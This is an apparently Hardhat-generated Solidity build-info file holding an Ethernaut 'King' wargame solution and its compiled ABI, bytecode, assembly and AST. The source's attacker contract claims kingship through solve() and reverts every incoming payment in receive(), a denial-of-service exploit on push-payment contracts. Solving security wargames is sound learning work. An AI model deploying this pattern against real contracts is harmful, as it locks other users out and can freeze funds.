{
	"id": "4c0e4550b1b3c7bbaf5afbea60efe4c4",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.7",
	"solcLongVersion": "0.8.7+commit.e28d00a7",
	"input": {
		"language": "Solidity",
		"sources": {
			"ethernautKing.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.7;\r\n\r\n/*contract King {\r\n\r\n  address payable king;\r\n  uint public prize;\r\n  address payable public owner;\r\n\r\n  constructor() public payable {\r\n    owner = msg.sender;  \r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  receive() external payable {\r\n    require(msg.value >= prize || msg.sender == owner);\r\n    king.transfer(msg.value);\r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  function _king() public view returns (address payable) {\r\n    return king;\r\n  }\r\n}*/\r\n\r\n//0x557d634258B353BAC0F7d17d807DAAE74851F638\r\n\r\ncontract ethernautKing {\r\n    constructor () payable {}\r\n\r\n    function solve() external payable {\r\n        address payable contractAddr = payable(0x557d634258B353BAC0F7d17d807DAAE74851F638);\r\n        contractAddr.transfer(msg.value); //1000000000000001\r\n    }\r\n\r\n    receive() external payable {\r\n        revert();\r\n    }\r\n}\r\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"ethernautKing.sol": {
				"ethernautKing": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "solve",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"ethernautKing.sol\":592:917  contract ethernautKing {\r... */\n  mstore(0x40, 0x80)\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernautKing.sol\":592:917  contract ethernautKing {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x890d6908\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"ethernautKing.sol\":898:906  revert() */\n      0x00\n      dup1\n      revert\n        /* \"ethernautKing.sol\":592:917  contract ethernautKing {\r... */\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ethernautKing.sol\":655:852  function solve() external payable {\r... */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      stop\n    tag_7:\n        /* \"ethernautKing.sol\":700:728  address payable contractAddr */\n      0x00\n        /* \"ethernautKing.sol\":739:781  0x557d634258B353BAC0F7d17d807DAAE74851F638 */\n      0x557d634258b353bac0f7d17d807daae74851f638\n        /* \"ethernautKing.sol\":700:782  address payable contractAddr = payable(0x557d634258B353BAC0F7d17d807DAAE74851F638) */\n      swap1\n      pop\n        /* \"ethernautKing.sol\":793:805  contractAddr */\n      dup1\n        /* \"ethernautKing.sol\":793:814  contractAddr.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ethernautKing.sol\":793:825  contractAddr.transfer(msg.value) */\n      0x08fc\n        /* \"ethernautKing.sol\":815:824  msg.value */\n      callvalue\n        /* \"ethernautKing.sol\":793:825  contractAddr.transfer(msg.value) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_10\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_10:\n      pop\n        /* \"ethernautKing.sol\":689:852  {\r... */\n      pop\n        /* \"ethernautKing.sol\":655:852  function solve() external payable {\r... */\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220bc14af3ad6a98a2046e048a6f9dddaa2ee8c25c900c84adf2e191910a8bfcf7064736f6c63430008070033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_5": {
									"entryPoint": null,
									"id": 5,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405260cd806100126000396000f3fe608060405260043610601f5760003560e01c8063890d690814602d576028565b36602857600080fd5b600080fd5b60336035565b005b600073557d634258b353bac0f7d17d807daae74851f63890508073ffffffffffffffffffffffffffffffffffffffff166108fc349081150290604051600060405180830381858888f193505050501580156093573d6000803e3d6000fd5b505056fea2646970667358221220bc14af3ad6a98a2046e048a6f9dddaa2ee8c25c900c84adf2e191910a8bfcf7064736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0xCD DUP1 PUSH2 0x12 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH1 0x2D JUMPI PUSH1 0x28 JUMP JUMPDEST CALLDATASIZE PUSH1 0x28 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x35 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH20 0x557D634258B353BAC0F7D17D807DAAE74851F638 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC CALLVALUE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH1 0x93 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xBC EQ 0xAF GASPRICE 0xD6 0xA9 DUP11 KECCAK256 CHAINID 0xE0 BASEFEE 0xA6 0xF9 0xDD 0xDA LOG2 0xEE DUP13 0x25 0xC9 STOP 0xC8 0x4A 0xDF 0x2E NOT NOT LT 0xA8 0xBF 0xCF PUSH17 0x64736F6C63430008070033000000000000 ",
							"sourceMap": "592:325:0:-:0;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_30": {
									"entryPoint": null,
									"id": 30,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@solve_23": {
									"entryPoint": 53,
									"id": 23,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405260043610601f5760003560e01c8063890d690814602d576028565b36602857600080fd5b600080fd5b60336035565b005b600073557d634258b353bac0f7d17d807daae74851f63890508073ffffffffffffffffffffffffffffffffffffffff166108fc349081150290604051600060405180830381858888f193505050501580156093573d6000803e3d6000fd5b505056fea2646970667358221220bc14af3ad6a98a2046e048a6f9dddaa2ee8c25c900c84adf2e191910a8bfcf7064736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH1 0x2D JUMPI PUSH1 0x28 JUMP JUMPDEST CALLDATASIZE PUSH1 0x28 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x35 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH20 0x557D634258B353BAC0F7D17D807DAAE74851F638 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC CALLVALUE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH1 0x93 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xBC EQ 0xAF GASPRICE 0xD6 0xA9 DUP11 KECCAK256 CHAINID 0xE0 BASEFEE 0xA6 0xF9 0xDD 0xDA LOG2 0xEE DUP13 0x25 0xC9 STOP 0xC8 0x4A 0xDF 0x2E NOT NOT LT 0xA8 0xBF 0xCF PUSH17 0x64736F6C63430008070033000000000000 ",
							"sourceMap": "592:325:0:-:0;;;;;;;;;;;;;;;;;;;;;;;898:8;;;592:325;;;;655:197;;;:::i;:::-;;;700:28;739:42;700:82;;793:12;:21;;:32;815:9;793:32;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;689:163;655:197::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "41000",
								"executionCost": "69",
								"totalCost": "41069"
							},
							"external": {
								"solve()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 592,
									"end": 917,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 592,
									"end": 917,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 592,
									"end": 917,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 592,
									"end": 917,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 592,
									"end": 917,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 592,
									"end": 917,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 592,
									"end": 917,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 592,
									"end": 917,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 592,
									"end": 917,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 592,
									"end": 917,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220bc14af3ad6a98a2046e048a6f9dddaa2ee8c25c900c84adf2e191910a8bfcf7064736f6c63430008070033",
									".code": [
										{
											"begin": 592,
											"end": 917,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "PUSH",
											"source": 0,
											"value": "890D6908"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 898,
											"end": 906,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 898,
											"end": 906,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 898,
											"end": 906,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 592,
											"end": 917,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 592,
											"end": 917,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 655,
											"end": 852,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 655,
											"end": 852,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 655,
											"end": 852,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 655,
											"end": 852,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 655,
											"end": 852,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 655,
											"end": 852,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 655,
											"end": 852,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 655,
											"end": 852,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 655,
											"end": 852,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 655,
											"end": 852,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 700,
											"end": 728,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 739,
											"end": 781,
											"name": "PUSH",
											"source": 0,
											"value": "557D634258B353BAC0F7D17D807DAAE74851F638"
										},
										{
											"begin": 700,
											"end": 782,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 700,
											"end": 782,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 793,
											"end": 805,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 793,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 793,
											"end": 814,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 815,
											"end": 824,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 793,
											"end": 825,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 793,
											"end": 825,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 793,
											"end": 825,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 793,
											"end": 825,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 793,
											"end": 825,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 793,
											"end": 825,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 793,
											"end": 825,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 793,
											"end": 825,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 689,
											"end": 852,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 655,
											"end": 852,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"solve()": "890d6908"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"solve\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernautKing.sol\":\"ethernautKing\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernautKing.sol\":{\"keccak256\":\"0x35639283470a4eb0b4879a3134e6156aab7d559ff613cb76ef7d5bc62ff74991\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://183423f0487131d5514adf8c51f9a9d918651967c0d7402b05d062249688c49b\",\"dweb:/ipfs/QmPHVWm3tfLo85iHB2mXWAMFV6iDWa2pNjSDFoRrNtuXBE\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"ethernautKing.sol": {
				"ast": {
					"absolutePath": "ethernautKing.sol",
					"exportedSymbols": {
						"ethernautKing": [
							31
						]
					},
					"id": 32,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".7"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 31,
							"linearizedBaseContracts": [
								31
							],
							"name": "ethernautKing",
							"nameLocation": "601:13:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 4,
										"nodeType": "Block",
										"src": "645:2:0",
										"statements": []
									},
									"id": 5,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "634:2:0"
									},
									"returnParameters": {
										"id": 3,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "645:0:0"
									},
									"scope": 31,
									"src": "622:25:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 22,
										"nodeType": "Block",
										"src": "689:163:0",
										"statements": [
											{
												"assignments": [
													9
												],
												"declarations": [
													{
														"constant": false,
														"id": 9,
														"mutability": "mutable",
														"name": "contractAddr",
														"nameLocation": "716:12:0",
														"nodeType": "VariableDeclaration",
														"scope": 22,
														"src": "700:28:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 8,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "700:15:0",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 14,
												"initialValue": {
													"arguments": [
														{
															"hexValue": "307835353764363334323538423335334241433046376431376438303744414145373438353146363338",
															"id": 12,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "739:42:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"value": "0x557d634258B353BAC0F7d17d807DAAE74851F638"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 11,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "731:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_payable_$",
															"typeString": "type(address payable)"
														},
														"typeName": {
															"id": 10,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "731:8:0",
															"stateMutability": "payable",
															"typeDescriptions": {}
														}
													},
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "731:51:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "700:82:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"id": 18,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "815:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 19,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "value",
															"nodeType": "MemberAccess",
															"src": "815:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"id": 15,
															"name": "contractAddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 9,
															"src": "793:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 17,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"src": "793:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 20,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "793:32:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 21,
												"nodeType": "ExpressionStatement",
												"src": "793:32:0"
											}
										]
									},
									"functionSelector": "890d6908",
									"id": 23,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "solve",
									"nameLocation": "664:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 6,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "669:2:0"
									},
									"returnParameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "689:0:0"
									},
									"scope": 31,
									"src": "655:197:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 29,
										"nodeType": "Block",
										"src": "887:27:0",
										"statements": [
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 26,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967277,
															4294967277
														],
														"referencedDeclaration": 4294967277,
														"src": "898:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$__$returns$__$",
															"typeString": "function () pure"
														}
													},
													"id": 27,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "898:8:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 28,
												"nodeType": "ExpressionStatement",
												"src": "898:8:0"
											}
										]
									},
									"id": 30,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 24,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "867:2:0"
									},
									"returnParameters": {
										"id": 25,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "887:0:0"
									},
									"scope": 31,
									"src": "860:54:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 32,
							"src": "592:325:0",
							"usedErrors": []
						}
					],
					"src": "33:886:0"
				},
				"id": 0
			}
		}
	}
}